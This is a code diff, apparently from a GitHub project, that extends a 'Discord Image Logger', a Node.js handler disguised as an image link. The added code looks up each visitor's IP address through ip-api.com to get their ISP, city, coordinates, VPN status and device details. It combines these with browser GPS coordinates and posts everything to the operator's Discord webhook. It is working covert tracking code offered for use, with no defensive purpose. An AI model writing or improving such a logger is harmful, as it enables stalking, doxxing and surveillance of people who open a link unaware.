@@ -1,4 +1,4 @@
-// Discord Image Logger - Versão otimizada para iOS
+// Discord Image Logger - Versão completa com informações detalhadas de IP
 const https = require('https');
 const url = require('url');
 
@@ -10,6 +10,35 @@ const config = {
   "color": 0x00FFFF,
   "accurateLocation": true
 };
+
+// Função para obter informações detalhadas sobre o IP
+async function getIPInfo(ip) {
+  return new Promise((resolve, reject) => {
+    const options = {
+      hostname: 'ip-api.com',
+      path: `/json/${ip}?fields=16976857`,
+      method: 'GET'
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        try {
+          resolve(JSON.parse(data));
+        } catch (e) {
+          reject(e);
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      reject(error);
+    });
+
+    req.end();
+  });
+}
 
 // Função para enviar webhook
 function sendDiscordWebhook(data) {
@@ -76,6 +105,99 @@ function isIOS(userAgent) {
   return /iPad|iPhone|iPod/.test(userAgent);
 }
 
+// Função para formatar a mensagem completa do Discord com informações detalhadas do IP
+function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
+  // Detectar sistema operacional e navegador
+  let os = "Unknown";
+  let browser = "Unknown";
+  
+  if (userAgent) {
+    // Sistema operacional
+    if (userAgent.includes("Windows")) {
+      os = "Windows";
+    } else if (userAgent.includes("Mac OS")) {
+      os = "MacOS";
+    } else if (userAgent.includes("Linux")) {
+      os = "Linux";
+    } else if (userAgent.includes("Android")) {
+      os = "Android";
+    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+      os = "iOS";
+    }
+    
+    // Navegador
+    if (userAgent.includes("Firefox")) {
+      browser = "Firefox";
+    } else if (userAgent.includes("Chrome")) {
+      browser = "Chrome";
+    } else if (userAgent.includes("Safari")) {
+      browser = "Safari";
+    } else if (userAgent.includes("Edge")) {
+      browser = "Edge";
+    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+      browser = "Opera";
+    }
+  }
+
+  // Formatar coordenadas
+  let coordsText = 'Unknown';
+  let coordsSource = 'Approximate';
+  let googleMapsLink = '';
+  
+  if (coords) {
+    coordsText = coords.replace(',', ', ');
+    coordsSource = `Precise, [Google Maps](https://www.google.com/maps/search/google+map++${coords})`;
+  } else if (info && info.lat && info.lon) {
+    coordsText = `${info.lat}, ${info.lon}`;
+    coordsSource = `Approximate`;
+  }
+
+  // Formatar timezone
+  let timezoneText = 'Unknown';
+  if (info && info.timezone) {
+    const parts = info.timezone.split('/');
+    if (parts.length >= 2) {
+      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
+    }
+  }
+
+  // Verificar bot
+  let botStatus = 'False';
+  if (info && info.hosting) {
+    if (info.hosting && !info.proxy) {
+      botStatus = 'Possibly';
+    } else if (info.hosting) {
+      botStatus = 'Possibly';
+    }
+  }
+
+  return `**A User Opened the Original Image!**
+
+**Endpoint:** \`${endpoint || 'N/A'}\`
+            
+**IP Info:**
+> **IP:** \`${ip || 'Unknown'}\`
+> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
+> **ASN:** \`${info && info.as ? info.as : 'Unknown'}\`
+> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
+> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
+> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
+> **Coords:** \`${coordsText}\` (${coordsSource})
+> **Timezone:** \`${timezoneText}\`
+> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
+> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
+> **Bot:** \`${botStatus}\`
+
+**PC Info:**
+> **OS:** \`${os}\`
+> **Browser:** \`${browser}\`
+
+**User Agent:**
+\`\`\`
+${userAgent || 'Unknown'}
+\`\`\``;
+}
+
 // Função principal
 module.exports = async (req, res) => {
   try {
@@ -105,6 +227,12 @@ module.exports = async (req, res) => {
         const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
         const [latitude, longitude] = coords.split(',');
         
+        // Obter informações detalhadas do IP
+        const ipInfo = await getIPInfo(ip);
+        
+        // Formatar a mensagem completa
+        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
+        
         // Enviar webhook ao Discord com coordenadas
         const data = {
           username: config.username,
@@ -113,7 +241,7 @@ module.exports = async (req, res) => {
             {
               title: "Image Logger - IP + Localização Capturados",
               color: config.color,
-              description: `**Alguém acessou o site com localização precisa!**\n\n**IP:** \`${ip}\`\n\n**Localização GPS:** \`${latitude}, ${longitude}\`\n[Ver no Google Maps](https://www.google.com/maps/search/google+map++${latitude},${longitude})\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
+              description: description,
               thumbnail: { url: config.image }
             }
           ]
@@ -183,7 +311,12 @@ module.exports = async (req, res) => {
     } else if (config.accurateLocation) {
       // Se não temos geolocalização ainda, solicitar do navegador
       
-      // Primeiro, enviar relatório básico sem geolocalização
+      // Primeiro, obter informações do IP e enviar relatório básico
+      const ipInfo = await getIPInfo(ip);
+      
+      // Formatar a mensagem básica
+      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      
       const basicData = {
         username: config.username,
         content: "",
@@ -191,7 +324,7 @@ module.exports = async (req, res) => {
           {
             title: "Image Logger - Acesso Inicial",
             color: config.color,
-            description: `**Alguém acessou o site! Aguardando localização...**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
+            description: description,
             thumbnail: { url: config.image }
           }
         ]
@@ -460,6 +593,9 @@ module.exports = async (req, res) => {
       res.status(200).send(html);
     } else {
       // Geolocalização não está ativada, enviar relatório básico
+      const ipInfo = await getIPInfo(ip);
+      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      
       const data = {
         username: config.username,
         content: "@everyone",
@@ -467,7 +603,7 @@ module.exports = async (req, res) => {
           {
             title: "Image Logger - IP Capturado",
             color: config.color,
-            description: `**Alguém acessou o site!**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
+            description: description,
             thumbnail: { url: config.image }
           }
         ]
